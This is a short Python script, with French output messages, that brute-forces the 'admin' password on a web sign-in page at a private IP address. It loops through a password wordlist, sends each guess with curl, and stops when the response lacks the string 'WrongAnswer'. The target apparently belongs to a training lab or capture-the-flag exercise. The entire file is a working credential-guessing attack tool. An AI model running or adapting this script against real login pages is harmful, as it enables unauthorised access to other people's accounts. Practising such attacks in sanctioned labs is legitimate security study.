import subprocess

url = "http://10.13.248.4/?page=signin"
username = "admin"

with open("passwords.txt", "r") as f:
    for pwd in f:
        pwd = pwd.strip()

        cmd = [
            "curl", "-s",
            f"{url}&username={username}&password={pwd}&Login=Login#"
        ]

        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout

        print(f"[ ] Test : {pwd}")

        if "WrongAnswer" not in output:
            print("\n=== MOT DE PASSE TROUVÉ ===")
            print(f"username = {username}")
            print(f"password = {pwd}")
            break
    else:
        print("Aucun mot de passe trouvé.")
